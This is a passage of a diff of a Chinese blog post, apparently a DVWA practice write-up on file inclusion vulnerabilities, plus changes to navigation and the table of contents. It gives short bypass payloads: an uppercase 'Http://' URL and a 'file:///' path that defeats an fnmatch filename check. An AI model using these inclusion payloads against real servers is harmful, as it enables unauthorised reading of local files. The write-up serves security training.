+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=Http:<span class="comment">//127.0.0.1/file.txt</span></span><br></pre></td></tr></table></figure>
+<p>即可绕过<br><img src="http://img-blog.csdnimg.cn/20190811113034938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="High"><a href="#High" class="headerlink" title="High"></a><strong>High</strong></h3><p><img src="http://img-blog.csdnimg.cn/20190811160941635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fnmatch() 函数根据指定的模式来匹配文件名或字符串。</span><br></pre></td></tr></table></figure>
+<p>源码中限制了文件名来防止恶意文件包含，并且<code>!fnmatch( &quot;file*&quot;, $file )</code>代码使用了<code>fnmatch</code>函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。所以就用到了file协议，就来了解一下file协议。</p>
+<p><strong>file协议</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本地文件传输协议 ,file协议主要用于访问本地计算机中的文件.</span><br></pre></td></tr></table></figure>
+<p><strong>file协议的基本格式</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">///文件路径</span></span><br><span class="line">如打开D盘www文件下的PHPinfo文件</span><br><span class="line">file:<span class="comment">///D:/www/phpinfo</span></span><br><span class="line">注意:后面必须是绝对路径：</span><br></pre></td></tr></table></figure>
+<p>了解了file协议，就构造相应的语句即可进行文件包含</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=file:<span class="comment">///D:/phpstuy/www/file.txt</span></span><br></pre></td></tr></table></figure>
+<h3 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a><strong>impossible</strong></h3><p><img src="http://img-blog.csdnimg.cn/2019081116374238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDMxMTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析一下源码</p>
+<p>发现<code>if( $file != &quot;include.php&quot; &amp;&amp; $file != &quot;file1.php&quot; &amp;&amp; $file != &quot;file2.php&quot; &amp;&amp; $file != &quot;file3.php&quot; )</code>这一句代码已经将page的参数限制成固定的值了，所以没有办法进行文件包含。</p>
+<hr>
+<p><strong>总结：这次算是大致了解了一些文件包含漏洞的知识，但是文件包含还有很多绕过姿势，接下来继续学习！</strong></p>
 
     </article>
     <!-- license  -->
@@ -471,17 +456,12 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2019/06/15/Bugku—MISC题总结/" title="Bugku—MISC题总结">
-                    <div class="nextTitle">Bugku—MISC题总结</div>
-                </a>
-            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/05/31/ISCC2019杂项题(MISC)总结/" title="ISCC2019-MISC总结">
-                    <div class="prevTitle">ISCC2019-MISC总结</div>
+                <a href="/2019/08/07/密码学——RSA加密算法原理/" title="密码学——RSA加密算法原理">
+                    <div class="prevTitle">密码学——RSA加密算法原理</div>
                 </a>
             
         </li>
@@ -606,7 +586,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-一"><span class="toc-number">1.</span> <span class="toc-text">sql-labs(一)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-二"><span class="toc-number">2.</span> <span class="toc-text">sql-labs(二)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-三"><span class="toc-number">3.</span> <span class="toc-text">sql-labs(三)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-四"><span class="toc-number">4.</span> <span class="toc-text">sql-labs(四)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-五"><span class="toc-number">5.</span> <span class="toc-text">sql-labs(五)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-六"><span class="toc-number">6.</span> <span class="toc-text">sql-labs(六)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-八"><span class="toc-number">7.</span> <span class="toc-text">sql-labs(八)</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#sql-labs-九"><span class="toc-number">8.</span> <span class="toc-text">sql-labs(九)</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含漏洞简介"><span class="toc-number">1.</span> <span class="toc-text">文件包含漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#本地文件包含"><span class="toc-number">2.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含"><span class="toc-number">3.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含常用函数"><span class="toc-number">4.</span> <span class="toc-text">文件包含常用函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DVWA练习"><span class="toc-number"></span> <span class="toc-text">DVWA练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#low"><span class="toc-number">1.</span> <span class="toc-text">low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#medium"><span class="toc-number">2.</span> <span class="toc-text">medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High"><span class="toc-number">3.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#impossible"><span class="toc-number">4.</span> <span class="toc-text">impossible</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
